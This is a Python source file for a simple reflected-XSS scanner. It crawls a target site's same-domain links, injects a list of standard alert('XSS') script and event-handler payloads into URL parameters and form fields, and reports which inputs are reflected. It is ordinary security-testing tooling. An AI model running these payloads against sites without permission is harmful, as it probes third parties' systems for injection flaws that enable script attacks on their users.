#!/usr/bin/env python3
"""
Simple XSS Scanner for quick testing
A lightweight version without heavy dependencies
"""

import requests
import urllib.parse
import argparse
import json
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import re

class SimpleXSSScanner:
    """Lightweight XSS scanner without Selenium dependency"""
    
    def __init__(self, target_url, timeout=10, threads=5):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.threads = threads
        self.session = requests.Session()
        self.session.timeout = timeout
        self.vulnerabilities = []
        
        # User agent
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Basic XSS payloads
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'\"><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "';alert('XSS');//",
            "\";alert('XSS');//"
        ]
    
    def discover_urls(self, base_url):
        """Simple URL discovery"""
        urls = set([base_url])
        
        try:
            response = self.session.get(base_url)
            if response.status_code == 200:
                # Extract links using regex
                link_pattern = r'(?:href|action)=["\']([^"\']+)["\']'
                matches = re.findall(link_pattern, response.text, re.IGNORECASE)
                
                for match in matches:
                    absolute_url = urllib.parse.urljoin(base_url, match)
                    parsed = urllib.parse.urlparse(absolute_url)
                    
                    # Only same domain
                    if parsed.netloc == urllib.parse.urlparse(base_url).netloc:
                        urls.add(absolute_url)
        except Exception:
            pass
        
        return urls
    
    def test_reflected_xss(self, url):
        """Test for reflected XSS"""
        parsed_url = urllib.parse.urlparse(url)
        
        # Test GET parameters
        if parsed_url.query:
            params = urllib.parse.parse_qs(parsed_url.query)
            
            for param_name in params:
                for payload in self.payloads:
                    test_params = params.copy()
                    test_params[param_name] = [payload]
                    
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                    query_string = urllib.parse.urlencode(test_params, doseq=True)
                    full_url = f"{test_url}?{query_string}"
                    
                    try:
                        response = self.session.get(full_url)
                        if payload in response.text and 'text/html' in response.headers.get('content-type', ''):
                            vuln = {
                                'type': 'Reflected XSS',
                                'url': full_url,
                                'parameter': param_name,
                                'payload': payload,
                                'method': 'GET'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[VULN] Reflected XSS found: {param_name} in {url}")
                            return vuln
                    except Exception:
                        continue
        
        return None
    
    def test_form_xss(self, url):
        """Test forms for XSS"""
        try:
            response = self.session.get(url)
            
            # Find forms using regex
            form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
            input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
            
            forms = re.findall(form_pattern, response.text, re.IGNORECASE | re.DOTALL)
            
            for form_action, form_content in forms:
                form_url = urllib.parse.urljoin(url, form_action)
                inputs = re.findall(input_pattern, form_content, re.IGNORECASE)
                
                if inputs:
                    for payload in self.payloads[:3]:  # Test fewer payloads for forms
                        form_data = {}
                        for input_name in inputs:
                            form_data[input_name] = payload
                        
                        try:
                            post_response = self.session.post(form_url, data=form_data)
                            if payload in post_response.text:
                                vuln = {
                                    'type': 'Reflected XSS (Form)',
                                    'url': form_url,
                                    'parameter': list(form_data.keys()),
                                    'payload': payload,
                                    'method': 'POST'
                                }
                                self.vulnerabilities.append(vuln)
                                print(f"[VULN] Form XSS found in {form_url}")
                                return vuln
                        except Exception:
                            continue
        except Exception:
            pass
        
        return None
    
    def test_url(self, url):
        """Test a single URL"""
        vulnerabilities = []
        
        # Test reflected XSS
        reflected = self.test_reflected_xss(url)
        if reflected:
            vulnerabilities.append(reflected)
        
        # Test form XSS
        form_xss = self.test_form_xss(url)
        if form_xss:
            vulnerabilities.append(form_xss)
        
        return vulnerabilities
    
    def scan(self):
        """Main scan function"""
        print(f"Starting simple XSS scan for {self.target_url}")
        start_time = datetime.now()
        
        # Discover URLs
        print("Discovering URLs...")
        urls = self.discover_urls(self.target_url)
        print(f"Found {len(urls)} URLs to test")
        
        # Test URLs
        print("Testing for XSS vulnerabilities...")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = [executor.submit(self.test_url, url) for url in urls]
            
            for future in futures:
                try:
                    result = future.result()
                    if result:
                        self.vulnerabilities.extend(result)
                except Exception as e:
                    print(f"Error testing URL: {e}")
        
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()
        
        # Generate report
        report = {
            'scan_info': {
                'target': self.target_url,
                'start_time': start_time.isoformat(),
                'end_time': end_time.isoformat(),
                'duration_seconds': duration,
                'urls_tested': len(urls),
                'vulnerabilities_found': len(self.vulnerabilities)
            },
            'vulnerabilities': self.vulnerabilities
        }
        
        print(f"\nScan completed in {duration:.2f} seconds")
        print(f"Found {len(self.vulnerabilities)} vulnerabilities")
        
        return report

def main():
    parser = argparse.ArgumentParser(description='Simple XSS Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads')
    parser.add_argument('--output', help='Output file (JSON)')
    
    args = parser.parse_args()
    
    if not args.url.startswith(('http://', 'https://')):
        print("Error: URL must start with http:// or https://")
        return
    
    try:
        scanner = SimpleXSSScanner(args.url, args.timeout, args.threads)
        report = scanner.scan()
        
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"Report saved to {args.output}")
        
        # Print vulnerabilities
        if report['vulnerabilities']:
            print("\nVulnerabilities found:")
            for i, vuln in enumerate(report['vulnerabilities'], 1):
                print(f"{i}. {vuln['type']} at {vuln['url']}")
                print(f"   Parameter: {vuln['parameter']}")
                print(f"   Payload: {vuln['payload'][:50]}...")
        else:
            print("\nNo vulnerabilities found!")
            
    except KeyboardInterrupt:
        print("\nScan interrupted by user")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    main()
